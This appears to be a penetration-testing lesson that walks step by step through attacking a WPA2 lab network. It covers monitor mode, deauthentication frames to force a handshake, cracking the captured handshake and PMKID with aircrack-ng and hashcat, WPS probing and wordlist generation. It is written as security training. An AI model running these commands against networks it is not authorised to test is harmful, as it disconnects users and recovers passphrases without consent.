# Wireless and WPA Attacks - Typing

This lesson types the wireless workflow against a lab access point the tester
controls: put the interface into monitor mode, survey the network, capture
the handshake, and crack the passphrase. The lab AP broadcasts the SSID
"LabNet" on channel 6.

## Install the wireless tooling

The aircrack-ng suite is packaged for Arch.

```bash
# install the wireless attack tools
sudo pacman -S aircrack-ng

# install supporting wireless utilities
sudo pacman -S iw
```

The suite covers capture, injection, and cracking.

## Check the wireless interface

Confirm the hardware and driver support monitor mode.

```bash
# list the wireless interfaces
iw dev

# show the current interface mode
iw dev wlan0 info

# check the driver in use
ls -l /sys/class/net/wlan0/device/driver
```

Monitor mode is only possible if the driver permits it.

## Enter monitor mode

Stop network management and switch the card to capture mode.

```bash
# list interfaces that can enter monitor mode
sudo airmon-ng

# stop processes that interfere with monitor mode
sudo airmon-ng check kill

# enable monitor mode on the interface
sudo airmon-ng start wlan0
```

The interface is renamed, usually to wlan0mon.

## Confirm the monitor interface

Verify the card is capturing before scanning.

```bash
# show the new monitor interface
iw dev

# confirm the mode is monitor
iw dev wlan0mon info

# start a quick capture to verify frames arrive
sudo tcpdump -i wlan0mon -c 5 -n
```

Frames arriving at the monitor interface confirm the setup.

## Survey the airwaves

Discover the networks the radio can see.

```bash
# scan the channels and save the survey
sudo airodump-ng wlan0mon --band bg \
    -w exploit/wireless/survey

# target the lab network on its channel
sudo airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF -c 6 \
    -w exploit/wireless/capture
```

The output lists every network within range.

## Read the survey results

The encryption column decides which attack applies.

```bash
# show the captured network headers
head -n 12 exploit/wireless/survey-01.csv

# extract the lab network's details
grep -i labnet exploit/wireless/survey-01.csv
```

WPA2 in the encryption column points to the handshake attack.

## Capture the handshake

Watch for a client join and record the four-way handshake.

```bash
# keep the capture running on the lab channel
sudo airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF -c 6 \
    -w exploit/wireless/handshake
```

A handshake line appears in the capture when a client joins.

## Force a handshake in the lab

On the tester's own access point, a deauthentication triggers a reconnect.

```bash
# send deauthentication frames to the lab client
sudo aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF \
    -c CC:CC:CC:CC:CC:CC wlan0mon
```

The forced reconnect produces a fresh handshake for the listener.

## Verify the handshake was captured

Confirm the capture contains the handshake before cracking.

```bash
# check the capture for a handshake
sudo aircrack-ng exploit/wireless/handshake-01.cap \
    | grep -i handshake
```

A WPA handshake line confirms the capture is usable.

## Crack the passphrase

Run the captured handshake against a wordlist.

```bash
# crack the handshake with aircrack-ng
sudo aircrack-ng exploit/wireless/handshake-01.cap \
    -w /usr/share/wordlists/rockyou.txt

# or crack with a targeted wordlist
sudo aircrack-ng exploit/wireless/handshake-01.cap \
    -w exploit/wordlist.txt
```

A match prints the recovered passphrase.

## Convert the capture for hashcat

hashcat needs the handshake in its own format.

```bash
# install the conversion tool
sudo pacman -S hashcat-utils

# convert the capture to hashcat format
cap2hccapx exploit/wireless/handshake-01.cap \
    exploit/wireless/handshake.hccapx

# crack the converted handshake with hashcat
hashcat -m 22000 exploit/wireless/handshake.hccapx \
    /usr/share/wordlists/rockyou.txt
```

GPU cracking uses the converted handshake format.

## Capture the PMKID

The PMKID attack works without any client.

```bash
# capture PMKID frames from the lab access point
sudo hcxdumptool -i wlan0mon -o exploit/wireless/pmkid.pcapng \
    --filterlist_ap=AA:BB:CC:DD:EE:FF --filtermode=2

# crack the PMKID capture with hashcat
hashcat -m 22000 exploit/wireless/pmkid.pcapng \
    /usr/share/wordlists/rockyou.txt
```

A PMKID capture removes the need for a client handshake.

## Check for WPS

WPS exposure is found with a quick probe.

```bash
# scan for WPS-enabled access points
sudo wash -i wlan0mon
```

A WPS-enabled access point is an additional attack surface.

## Restore the interface

Return the card to normal use after the test.

```bash
# stop monitor mode
sudo airmon-ng stop wlan0mon

# restart the network management service
sudo systemctl restart NetworkManager

# confirm the interface is back to managed mode
iw dev wlan0
```

The lab session leaves the hardware in its original state.

## Generate candidate passphrases

When a wordlist misses, a pattern generator covers common formats.

```bash
# install the pattern generator
sudo pacman -S crunch

# generate lab-themed candidates with the year appended
crunch 8 12 LabNet2026 -t LabNet%%%% -o exploit/wireless/cand.txt

# add the generated list to the cracking input
sudo aircrack-ng exploit/wireless/handshake-01.cap \
    -w exploit/wireless/cand.txt
```

Pattern generation targets the way the lab passphrase was chosen.

## Check the WPA3 exchange

Modern access points need a different capture approach.

```bash
# survey which networks advertise WPA3
sudo airodump-ng wlan0mon --band bg

# check the EAPOL handling for the lab network
grep -i 'WPA3' exploit/wireless/survey-01.csv
```

WPA3 resists the classic handshake attack, so its presence is recorded as a
positive control.

## Document the wireless findings

Record the test results for the report.

```bash
# write the wireless notes
cat > exploit/wireless/findings.md <<'EOF'
# Wireless findings

network: LabNet (AA:BB:CC:DD:EE:FF, channel 6)
protocol: WPA2-Personal
capture: handshake in handshake-01.cap
result: passphrase recovered from wordlist
evidence: exploit/wireless/handshake-01.cap
EOF

# show the notes
cat exploit/wireless/findings.md
```

The notes name the network, the attack, and the recovered passphrase.

## Wrap up

Wireless sequence: monitor mode -> survey -> handshake capture -> crack ->
PMKID/WPS checks -> restore -> document.
